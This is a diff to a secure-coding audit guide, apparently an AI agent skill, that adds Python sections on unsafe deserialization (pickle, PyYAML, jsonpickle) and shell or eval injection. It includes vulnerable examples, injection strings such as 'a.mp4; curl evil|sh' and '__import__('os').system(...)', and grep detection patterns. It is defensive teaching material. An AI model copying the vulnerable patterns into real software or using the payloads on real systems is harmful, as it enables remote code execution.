@@ -1,6 +1,6 @@
 ---
 name: logging-monitoring
-description: Audits logging, monitoring, and integrity failures (OWASP A09/A08/A05:2025) - error responses leaking stack traces and internals, secrets or PII written to logs and crash reporters, missing audit logging and alerting for security events, insecure deserialization of untrusted data, and command/code injection via shell-exec or dynamic-eval. Use when writing error handlers, logging, deserializing untrusted data, or running subprocesses, or when auditing observability and incident readiness.
+description: Audits logging, monitoring, and integrity failures (OWASP A09/A08/A05:2025) - error responses leaking stack traces and internals, secrets or PII written to logs and crash reporters, missing audit logging and alerting for security events, insecure deserialization of untrusted data, and command/code injection via shell-exec or dynamic-eval. Covers both JS/TS and Python (pickle, PyYAML, jsonpickle, shell=True, eval/exec). Use when writing error handlers, logging, deserializing untrusted data, or running subprocesses, or when auditing observability and incident readiness.
 license: MIT
 ---
 
@@ -109,6 +109,35 @@ const session = SessionSchema.parse(JSON.parse(raw));                 // no code
 
 Prefer pure-data formats (JSON); only deserialize signed/HMAC'd payloads; validate against a schema.
 
+### Python: `pickle`, `PyYAML`, `jsonpickle`
+
+Same threat model, different names — and Python's are worse, because `pickle` is the *idiomatic*
+serializer for caches, queues, and `.pkl` model files, so untrusted bytes reach it easily.
+
+```python
+# BAD — every one of these executes attacker-supplied code
+session = pickle.loads(request.cookies["session"])      # __reduce__ runs os.system
+config  = yaml.load(body, Loader=yaml.UnsafeLoader)     # !!python/object/apply:os.system
+obj     = jsonpickle.decode(body)                       # py/reduce runs os.system
+
+# GOOD — pure data, integrity-checked, schema-validated
+raw     = verify_hmac(request.cookies["session"], SESSION_KEY)
+session = SessionModel.model_validate_json(raw)         # Pydantic; no code execution
+config  = yaml.safe_load(body)                          # ConstructorError on py/object tags
+```
+
+Three details that change what you grep for, each verified by execution:
+
+- **`yaml.safe_load` and `Loader=yaml.FullLoader` both block** the `!!python/object/apply`
+  payload (`ConstructorError`). Only `Loader=yaml.Loader` and `Loader=yaml.UnsafeLoader` execute
+  it — so "`yaml.load` is dangerous" is too blunt a rule to grep on.
+- **Bare `yaml.load(data)` is a `TypeError` in PyYAML ≥ 6** — `Loader` is a required positional
+  argument. The classic advice is stale; the live danger is an explicit unsafe `Loader=`.
+- **`jsonpickle.decode(..., safe=True)` does NOT make jsonpickle safe.** A `py/reduce` payload
+  executes under `safe=False`, `safe=True`, *and* the default. The flag's name actively misleads.
+
+Detection: `grep -rn "pickle.load\|pickle.loads\|jsonpickle.decode\|yaml.unsafe_load\|Loader=yaml\.\(Unsafe\)\?Loader\|shelve.open\|dill.load" --include="*.py"`
+
 ## 5. Command / Code Injection (A05:2025)
 
 **What to look for:** building a shell command string from user input and running it through a shell;
@@ -133,8 +162,34 @@ execFile("convert", [String(req.query.file), "out.png"], { shell: false }, cb);
 For dynamic logic, never eval user input - use a lookup map or a sandboxed expression library with an
 allowlist. Run with least privilege. See `secaudit:data-access` for SQL/ORM injection.
 
+### Python: `shell=True`, `eval`, `exec`
+
+The single most common Python sink an AI assistant generates for "run the user's formula" or
+"convert this file". Verified by execution: `shell=True` ran the appended command, while the argv
+form passed `report.txt; echo PWNED` through as one literal argument.
+
+```python
+# BAD
+subprocess.run(f"ffmpeg -i {filename} out.mp4", shell=True)   # "a.mp4; curl evil|sh"
+result = eval(request.json["expression"])                      # __import__('os').system(...)
+
+# GOOD — argv list, no shell; literal_eval for data
+subprocess.run(["ffmpeg", "-i", filename, "out.mp4"], shell=False, check=True)
+result = ast.literal_eval(request.json["expression"])          # ValueError on __import__
+```
+
+`subprocess.run` already defaults to `shell=False`, so **`shell=True` is always a deliberate,
+greppable choice** — which makes this one of the highest-signal greps in a Python codebase.
+
+Detection: `grep -rn "shell=True\|os.system(\|os.popen(\|\beval(\|\bexec(" --include="*.py"`
+
 ## Sources
 
+- https://docs.python.org/3/library/pickle.html -- stdlib warning: not secure against maliciously constructed data
+- https://pyyaml.org/wiki/PyYAMLDocumentation -- loader classes and safe_load
+- https://github.com/jsonpickle/jsonpickle/issues/178 -- safe=True does not prevent py/reduce execution
+- https://docs.python.org/3/library/subprocess.html -- shell=True security considerations
+- https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html -- Python deserialization
 - https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html -- what to log, what to exclude
 - https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html -- safe error responses
 - https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/ -- OWASP A09:2025 overview
